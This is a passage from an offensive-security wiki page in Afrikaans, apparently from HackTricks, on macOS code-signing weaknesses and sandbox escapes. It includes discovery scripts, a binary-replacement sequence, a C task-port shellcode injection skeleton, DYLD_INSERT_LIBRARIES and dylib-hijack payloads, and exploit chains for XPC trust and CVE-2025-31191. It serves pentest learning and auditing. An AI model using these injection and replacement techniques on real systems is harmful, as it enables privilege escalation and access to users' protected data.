# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc-ondertekende Binaries

### Basiese Inligting

**Ad-hoc signing** (`CS_ADHOC`) skep ’n code signature met **geen certificate chain nie**. Dit has steeds die signed code, sodat validation modification kan detecteer, maar dit verskaf geen developer identity wat ’n ander component kan authenticate nie. Deur die executable te vervang en weer te sign, word ’n ander CodeDirectory/CDHash geproduseer.<sup>[[1]](#references)[[4]](#references)</sup>

Op Apple Silicon Macs vereis alle executables ten minste ’n ad-hoc signature. Dit beteken jy sal ad-hoc signatures op baie development tools, Homebrew packages en third-party utilities vind.

### Waarom Dit Belangrik Is

- **Geen verifieerbare signer identity nie** — checks wat slegs ’n path, ’n ad-hoc status of ’n ongepinde identifier aanvaar, kan nie vasstel wie die binary geproduseer het nie.
- Third-party ad-hoc binaries in **bevoorregte posisies** (FDA, daemons, helpers) is hoëprioriteit-teikens wanneer hul file of ’n ouer directory writable is.
- ’n CDHash, designated-requirement of requirement-backed TCC check **let wel op** wanneer iets vervang word. ’n Path-based policy mag dalk nie; inspecteer die werklike requirement en retest die grant eerder as om aan te neem dat dit re-signing oorleef.

### Ontdekking
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Debugbare Prosesse (get-task-allow)

### Basiese Inligting

Die **`com.apple.security.get-task-allow`** entitlement (of **`CS_GET_TASK_ALLOW`**-vlag) laat ’n gemagtigde debugger toe om die proses se task port te verkry, selfs wanneer Hardened Runtime dit normaalweg sou voorkom. ’n Suksesvolle debugger kan geheue lees, registers wysig, kode inject en uitvoering beheer.<sup>[[3]](#references)</sup>

Dit is **slegs vir development builds** bedoel. Sommige third-party binaries word egter met hierdie entitlement in production verskeep.

> [!CAUTION]
> ’n Production binary met `get-task-allow` is ’n sterk exploitation primitive. `taskgated`, caller identity, sandboxing, debugger entitlements en Developer Tools authorization beïnvloed steeds of ’n spesifieke client die task port kan verkry; toets met beide `lldb`/`debugserver` en die beoogde injector. Sodra attachment slaag, loop injected code met die target se entitlements, TCC grants en security context.

### Ontdekking
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Aanval: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Clearing van Runtime Library Validation

Die private entitlement **`com.apple.private.security.clear-library-validation`** deaktiveer nie library validation wanneer die proses begin nie. In plaas daarvan laat dit die proses toe om tydens runtime `csops(..., CS_OPS_CLEAR_LV, ...)` op homself uit te voer. XNU maak dan `CS_REQUIRE_LV | CS_FORCED_LV` skoon, mits die caller die entitlement het en aan die handler se bykomende kontroles voldoen. Gevolglik kan ’n proses eers ’n geskikte library-injection-teiken word nadat dit die code path bereik wat library validation skoonmaak.<sup>[[4]](#references)[[5]](#references)</sup>

### Die Gevaarlike Kombinasie

Wanneer ’n binary **beide** het:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (laai enige dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (aanvaar DYLD env vars)

Dit is ’n waardevolle code-injection-kombinasie omdat Hardened Runtime beide die onbetroubare library en die DYLD environment variable toelaat. Die launch context kan DYLD-variables steeds scrub (byvoorbeeld protected of privileged execution paths), dus moet jy die presiese invocation verifieer eerder as om die entitlement-paar as onvoorwaardelik te beskou.

### Ontdekking
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Tydelike Sandbox-uitsonderings

### Hoe Hulle die Sandbox Verswak

Tydelike Sandbox-uitsonderings (`com.apple.security.temporary-exception.*`) skep gate in die App Sandbox:<sup>[[2]](#references)</sup>

| Uitsondering | Wat Dit Toelaat |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Koppel aan stelselwye XPC/Mach-dienste |
| `temporary-exception.files.absolute-path.read-write` | Lees/skryf lêers buite die app-houer |
| `temporary-exception.iokit-user-client-class` | Maak IOKit user-client-verbindings oop |
| `temporary-exception.shared-preference.read-only` | Lees ander apps se voorkeure |
| `temporary-exception.files.home-relative-path.read-write` | Kry toegang tot paaie relatief tot `~` |

### Mach-Lookup-uitsonderings = Sandbox Escape Primitive

Die gevaarlikste uitsondering is **mach-lookup** — dit laat ’n sandboxed app toe om met bevoorregte daemons te kommunikeer:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Aanval: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing Checks Are Not XPC Client Integrity

'n XPC-diens kan 'n verbinding autentiseer deur code-signing-status uit sy audit token te onttrek en 'n Apple **platform binary** of 'n kliënt wat `CS_REQUIRE_LV`/`CS_FORCED_LV` dra, te aanvaar. Hierdie toetse beskryf die uitvoerbare lêer en geselekteerde prosesvlae; hulle bewys nie dat die huidige adresruimte slegs vertroude code bevat nie. Navorsing oor ImageCapture-dienste het getoon dat 'n inspuitbare Apple binary soos `/bin/ls` 'n aanvaller-dylib deur `DYLD_INSERT_LIBRARIES` kon laai en daarna as 'n platform-kliënt kon verbind. 'n Opvolgkontrole vir library-validation-vlae is ook omseil voordat Apple die diens verander het om sy private authorization entitlement in macOS 15 te vereis.<sup>[[6]](#references)</sup>

### Aanvallende Ouditwerkvloei

1. Reverse `listener:shouldAcceptNewConnection:` (of die ekwivalente laevlak-XPC-handler) en identifiseer besluite wat slegs op `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` of `CS_FORCED_LV` gebaseer is.
2. Enumerate Apple-ondertekende kliënte wat met die protokol kan kommunikeer, en inspekteer daarna Hardened Runtime en entitlements. 'n Platform-signature alleen is nie bewys dat DYLD-injection geblokkeer word nie.
3. Toets die kandidaat op die **target macOS build**. As 'n constructor dylib laai, maak die diensverbinding vanuit daardie constructor sodat die audit token aan die aanvaarde platform-proses behoort.
4. Toets elke vendor-patch weer: die toevoeging van nog 'n mutable prosesstatus-vlag tot dieselfde authorization-besluit mag nie die confused-deputy-primitief verwyder nie.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> DYLD-gedrag, AMFI-beleid en kontroles aan die diens-kant verander tussen macOS-vrystellings. Mislukking teenoor 'n volledig gepatchte host bewys nie dat dieselfde chain op die kwesbare vrystelling misluk het nie.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks behou 'n gebruiker se lêerkeuse tussen launch-sessies. 'n Sandbox extension is aan die boot gebind, dus valideer `ScopedBookmarkAgent` dit en skep 'n langdurige HMAC-ge-authentiseerde bookmark; wanneer die app daardie bookmark later aanbied, valideer die agent dit en reik 'n nuwe sandbox extension uit. Die signing secret word in die login keychain gestoor, en 'n per-app key word met behulp van die bundle identifier afgelei.<sup>[[7]](#references)</sup>

Op geaffekteerde stelsels het die keychain ACL verhoed dat 'n onbetroubare proses die `com.apple.scopedbookmarksagent.xpc`-secret **lees**, maar het dit nie verhoed dat dit uitgevee word nie. 'n Gekompromitteerde sandboxed app kon die item met 'n bekende secret en attacker-beheerde ACL vervang, die app-spesifieke HMAC key aflei, entries in die skryfbare container bookmark plist vervals, en `ScopedBookmarkAgent` vra om dit vir file-access extensions om te ruil. Dit het enige sandboxed application wat security-scoped bookmarks gebruik, in 'n potensiële sandbox escape met arbitrêre lêertoegang verander, sonder 'n bykomende file-picker-interaksie. Apple het die probleem in die security updates van 31 Maart 2025 reggestel.<sup>[[7]](#references)</sup>

### Triage and Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Die ontginningsvolgorde op ’n kwesbare host is:

1. Kry code execution binne ’n sandboxed app wat persistent scoped bookmarks gebruik.
2. Vervang die agent se keychain signing item met ’n bekende secret en permissive ACL.
3. Bereken `HMAC-SHA256(key=known_secret, data=bundle_id)` en forge ’n bookmark vir ’n nuttige path in die app se writable bookmark store.
4. Trigger die toepassing se normale bookmark-resolution path sodat `ScopedBookmarkAgent` ’n sandbox extension teruggee.
5. Gebruik die nuwe file access om ’n out-of-sandbox execution- of data target wat vir daardie user beskikbaar is, te overwrite.

Hierdie is ’n **patched-version technique**: gebruik dit om die trust boundary te verstaan en om unpatched systems te assess, nie as ’n aanname oor huidige releases nie. Vir huidige testing, fokus op bookmark parsing, identity binding, keychain-item lifecycle en confused-deputy-gedrag rondom die agent.

---

## Private Apple Entitlements

### Wat Hulle Is

Entitlements met die prefix `com.apple.private.*` bied toegang tot **Apple-interne APIs** wat nie gedokumenteer of vir third-party developers beskikbaar is nie. Third-party binaries met private entitlements het dit deur enterprise cert, MDM of non-App-Store distribution verkry.

### Gevaarlike Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Volledige TCC-databasis read/write |
| `com.apple.private.tcc.allow` | Toegang tot spesifieke TCC-services |
| `com.apple.private.security.no-sandbox` | Run sonder sandbox |
| `com.apple.private.iokit` | Direkte IOKit-driver access |
| `com.apple.private.kernel.\*` | Kernel-interface access |
| `com.apple.private.xpc.launchd.job-label` | Register/manage launchd jobs |
| `com.apple.rootless.install` | Skryf na SIP-beskermde paths |

### Ontdekking
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Pasgemaakte Sandbox-profiele (SBPL)

### Wat Hulle Is

Binaries kan **pasgemaakte sandbox-profiele** insluit wat in SBPL (Seatbelt Profile Language) geskryf is. Hierdie profiele kan meer beperkend OF **meer permissief** as die verstek App Sandbox wees.

### Oudit van Pasgemaakte profiele
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Skryfbare Biblioteekpaaie

### Wat Hulle Is

Wanneer 'n binary 'n dynamic library vanaf 'n pad laai waartoe die huidige gebruiker **kan skryf**, kan die biblioteek met malicious code vervang word.

### Ontdekking
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Aanval: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Kode-ondertekeningsgids](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [’n Nuwe Era van macOS Sandbox Escapes: Ondersoek na ’n Oorgesiene Attack Surface en die Ontdekking van 10+ Nuwe Kwesbaarhede](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Ontleding van CVE-2025-31191: ’n macOS security-scoped bookmarks-gebaseerde sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
